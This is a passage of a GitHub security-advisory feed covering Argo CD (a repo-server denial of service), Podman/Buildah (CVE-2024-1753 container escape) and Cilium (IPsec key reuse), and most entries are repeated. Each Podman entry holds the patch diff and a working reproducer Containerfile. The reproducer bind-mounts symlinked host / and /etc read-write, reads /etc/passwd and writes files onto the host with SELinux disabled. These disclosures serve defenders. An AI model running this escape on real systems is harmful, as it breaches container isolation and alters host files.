<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29893">https://nvd.nist.gov/vuln/detail/CVE-2024-29893</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d">https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59">https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd">https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd</a></li>
<li><a href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/advisories/GHSA-jhwx-mhww-rgc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-29T19:04:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2] ArgoCD's repo server has Uncontrolled Resource Consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</id>
        <link href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3"/>
        <updated>2024-03-29T19:04:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All versions of ArgoCD starting from v2.4 have a bug where the ArgoCD repo-server component is vulnerable to a Denial-of-Service attack vector. Specifically,  it's possible to crash the repo server component through an out of memory error by pointing it to a malicious Helm registry.
The loadRepoIndex() function in the ArgoCD's helm package, does not limit the size nor time while fetching the data. It fetches it and creates a byte slice from the retrieved data in one go. If the registry is implemented to push data continuously, the repo server will keep allocating memory until it runs out of it.</p>
<h3 id="patches">Patches</h3>
<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.10.5
v2.9.10
v2.8.14</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<p>Open an issue in <a href="https://github.com/argoproj/argo-cd/issues">the Argo CD issue tracker</a> or <a href="https://github.com/argoproj/argo-cd/discussions">discussions</a>
Join us on <a href="https://argoproj.github.io/community/join-slack">Slack</a> in channel #argo-cd</p>
<h3 id="credits">Credits</h3>
<p>This vulnerability was found &amp; reported by Jakub Ciolek</p>
<p>The Argo team would like to thank these contributors for their responsible disclosure and constructive communications during the resolve of this issue</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/argoproj/argo-cd/security/advisories/GHSA-jhwx-mhww-rgc3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-29893">https://nvd.nist.gov/vuln/detail/CVE-2024-29893</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d">https://github.com/argoproj/argo-cd/commit/14f681e3ee7c38731943b98f92277e88a3db109d</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59">https://github.com/argoproj/argo-cd/commit/36b8a12a38f8d92d55bffc81deed44389bf6eb59</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd">https://github.com/argoproj/argo-cd/commit/3e5a878f6e30d935fa149723ea2a2e93748fcddd</a></li>
<li><a href="https://github.com/advisories/GHSA-jhwx-mhww-rgc3">https://github.com/advisories/GHSA-jhwx-mhww-rgc3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jhwx-mhww-rgc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-29T19:04:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v5] Podman affected by CVE-2024-1753 container escape at build time ]]></title>
        <id>https://github.com/advisories/GHSA-874v-pj72-92f3</id>
        <link href="https://github.com/advisories/GHSA-874v-pj72-92f3"/>
        <updated>2024-03-28T17:53:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind .  This is a patch for Buildah (<a href="https://github.com/containers/buildah">https://github.com/containers/buildah</a>).  Once fixed there, Buildah will be vendored into Podman.</p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-podman-with-the-issue">Testing with an older version of Podman with the issue</h5>
<pre><code>setenforce 0
podman build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>podman rm -a
podman rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
podman build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Podman.</p>
<p>When running using the patched version of Podman, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/podman/security/advisories/GHSA-874v-pj72-92f3">https://github.com/containers/podman/security/advisories/GHSA-874v-pj72-92f3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-1753">https://access.redhat.com/security/cve/CVE-2024-1753</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZVBSVZGVABPYIHK5HZM472NPGWMI7WXH">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZVBSVZGVABPYIHK5HZM472NPGWMI7WXH</a></li>
<li><a href="https://github.com/advisories/GHSA-874v-pj72-92f3">https://github.com/advisories/GHSA-874v-pj72-92f3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-874v-pj72-92f3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-28T17:53:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/podman/v4] Podman affected by CVE-2024-1753 container escape at build time ]]></title>
        <id>https://github.com/advisories/GHSA-874v-pj72-92f3</id>
        <link href="https://github.com/advisories/GHSA-874v-pj72-92f3"/>
        <updated>2024-03-28T17:53:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind .  This is a patch for Buildah (<a href="https://github.com/containers/buildah">https://github.com/containers/buildah</a>).  Once fixed there, Buildah will be vendored into Podman.</p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-podman-with-the-issue">Testing with an older version of Podman with the issue</h5>
<pre><code>setenforce 0
podman build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>podman rm -a
podman rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
podman build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Podman.</p>
<p>When running using the patched version of Podman, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/podman/security/advisories/GHSA-874v-pj72-92f3">https://github.com/containers/podman/security/advisories/GHSA-874v-pj72-92f3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1753">https://nvd.nist.gov/vuln/detail/CVE-2024-1753</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-1753">https://access.redhat.com/security/cve/CVE-2024-1753</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2265513">https://bugzilla.redhat.com/show_bug.cgi?id=2265513</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZVBSVZGVABPYIHK5HZM472NPGWMI7WXH">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZVBSVZGVABPYIHK5HZM472NPGWMI7WXH</a></li>
<li><a href="https://github.com/advisories/GHSA-874v-pj72-92f3">https://github.com/advisories/GHSA-874v-pj72-92f3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-874v-pj72-92f3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-28T17:53:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium has insecure IPsec transport encryption]]></title>
        <id>https://github.com/advisories/GHSA-pwqm-x5x6-5586</id>
        <link href="https://github.com/advisories/GHSA-pwqm-x5x6-5586"/>
        <updated>2024-03-29T16:47:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users of <a href="https://docs.cilium.io/en/stable/security/network/encryption-ipsec/">IPsec transparent encryption</a> in Cilium may be vulnerable to cryptographic attacks that render the transparent encryption ineffective.</p>
<p>In particular, Cilium is vulnerable to the following attacks by a man-in-the-middle attacker:</p>
<ul>
<li>Chosen plaintext attacks</li>
<li>Key recovery attacks</li>
<li>Replay attacks</li>
</ul>
<p>These attacks are possible due to an ESP sequence number collision when multiple nodes are configured with the same key. Fixed versions of Cilium use unique keys for each IPsec tunnel established between nodes, resolving all of the above attacks.</p>
<p><strong>Important:</strong> After upgrading, users must perform a key rotation using the instructions <a href="https://docs.cilium.io/en/latest/security/network/encryption-ipsec/#key-rotation">here</a> to ensure that they are no longer vulnerable to this issue. Please note that the key rotation instructions have recently been updated, and users must use the new instructions to properly establish secure IPsec tunnels. To validate that the new instructions have been followed properly, ensure that the IPsec Kubernetes secret contains a "+" sign.</p>
<h3 id="patches">Patches</h3>
<p>All prior versions of Cilium that support IPsec transparent encryption (Cilium 1.4 onwards) are affected by this issue.</p>
<p>Patched versions:</p>
<ul>
<li>Cilium 1.15.3</li>
<li>Cilium 1.14.9</li>
<li>Cilium 1.13.14</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue. IPsec transparent encryption users are strongly encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @NikAleksandrov and @pchaigno for their work on remediating the issue. Thanks to Marsh Ray, Senior Software Developer at Microsoft, for input and guidance on the fix.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>As usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: <a href="mailto:security@cilium.io">security@cilium.io</a> - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-pwqm-x5x6-5586">https://github.com/cilium/cilium/security/advisories/GHSA-pwqm-x5x6-5586</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28860">https://nvd.nist.gov/vuln/detail/CVE-2024-28860</a></li>
<li><a href="https://github.com/cilium/cilium/commit/311fbce5280491cddceab178d83b06fa23688c72">https://github.com/cilium/cilium/commit/311fbce5280491cddceab178d83b06fa23688c72</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a1742b478306fa256cd27df1039dfae0537b4149">https://github.com/cilium/cilium/commit/a1742b478306fa256cd27df1039dfae0537b4149</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a652c123331852cca90c74202f993d4170fd37fa">https://github.com/cilium/cilium/commit/a652c123331852cca90c74202f993d4170fd37fa</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-ipsec">https://docs.cilium.io/en/stable/security/network/encryption-ipsec</a></li>
<li><a href="https://github.com/advisories/GHSA-pwqm-x5x6-5586">https://github.com/advisories/GHSA-pwqm-x5x6-5586</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pwqm-x5x6-5586</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-28T17:27:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cilium/cilium] Cilium has insecure IPsec transport encryption]]></title>
        <id>https://github.com/advisories/GHSA-pwqm-x5x6-5586</id>
        <link href="https://github.com/advisories/GHSA-pwqm-x5x6-5586"/>
        <updated>2024-03-29T16:47:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users of <a href="https://docs.cilium.io/en/stable/security/network/encryption-ipsec/">IPsec transparent encryption</a> in Cilium may be vulnerable to cryptographic attacks that render the transparent encryption ineffective.</p>
<p>In particular, Cilium is vulnerable to the following attacks by a man-in-the-middle attacker:</p>
<ul>
<li>Chosen plaintext attacks</li>
<li>Key recovery attacks</li>
<li>Replay attacks</li>
</ul>
<p>These attacks are possible due to an ESP sequence number collision when multiple nodes are configured with the same key. Fixed versions of Cilium use unique keys for each IPsec tunnel established between nodes, resolving all of the above attacks.</p>
<p><strong>Important:</strong> After upgrading, users must perform a key rotation using the instructions <a href="https://docs.cilium.io/en/latest/security/network/encryption-ipsec/#key-rotation">here</a> to ensure that they are no longer vulnerable to this issue. Please note that the key rotation instructions have recently been updated, and users must use the new instructions to properly establish secure IPsec tunnels. To validate that the new instructions have been followed properly, ensure that the IPsec Kubernetes secret contains a "+" sign.</p>
<h3 id="patches">Patches</h3>
<p>All prior versions of Cilium that support IPsec transparent encryption (Cilium 1.4 onwards) are affected by this issue.</p>
<p>Patched versions:</p>
<ul>
<li>Cilium 1.15.3</li>
<li>Cilium 1.14.9</li>
<li>Cilium 1.13.14</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround to this issue. IPsec transparent encryption users are strongly encouraged to upgrade.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The Cilium community has worked together with members of Cure53 and Isovalent to prepare these mitigations. Special thanks to @NikAleksandrov and @pchaigno for their work on remediating the issue. Thanks to Marsh Ray, Senior Software Developer at Microsoft, for input and guidance on the fix.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, please reach out on <a href="https://docs.cilium.io/en/latest/community/community/#slack">Slack</a>.</p>
<p>As usual, if you think you found a related vulnerability, we strongly encourage you to report security vulnerabilities to our private security mailing list: <a href="mailto:security@cilium.io">security@cilium.io</a> - first, before disclosing them in any public forums. This is a private mailing list where only members of the Cilium internal security team are subscribed to, and is treated as top priority.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cilium/cilium/security/advisories/GHSA-pwqm-x5x6-5586">https://github.com/cilium/cilium/security/advisories/GHSA-pwqm-x5x6-5586</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28860">https://nvd.nist.gov/vuln/detail/CVE-2024-28860</a></li>
<li><a href="https://github.com/cilium/cilium/commit/311fbce5280491cddceab178d83b06fa23688c72">https://github.com/cilium/cilium/commit/311fbce5280491cddceab178d83b06fa23688c72</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a1742b478306fa256cd27df1039dfae0537b4149">https://github.com/cilium/cilium/commit/a1742b478306fa256cd27df1039dfae0537b4149</a></li>
<li><a href="https://github.com/cilium/cilium/commit/a652c123331852cca90c74202f993d4170fd37fa">https://github.com/cilium/cilium/commit/a652c123331852cca90c74202f993d4170fd37fa</a></li>
<li><a href="https://docs.cilium.io/en/stable/security/network/encryption-ipsec">https://docs.cilium.io/en/stable/security/network/encryption-ipsec</a></li>
<li><a href="https://github.com/advisories/GHSA-pwqm-x5x6-5586">https://github.com/advisories/GHSA-pwqm-x5x6-5586</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pwqm-x5x6-5586</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-28T17:27:40.000Z</published>
    </entry>
</feed>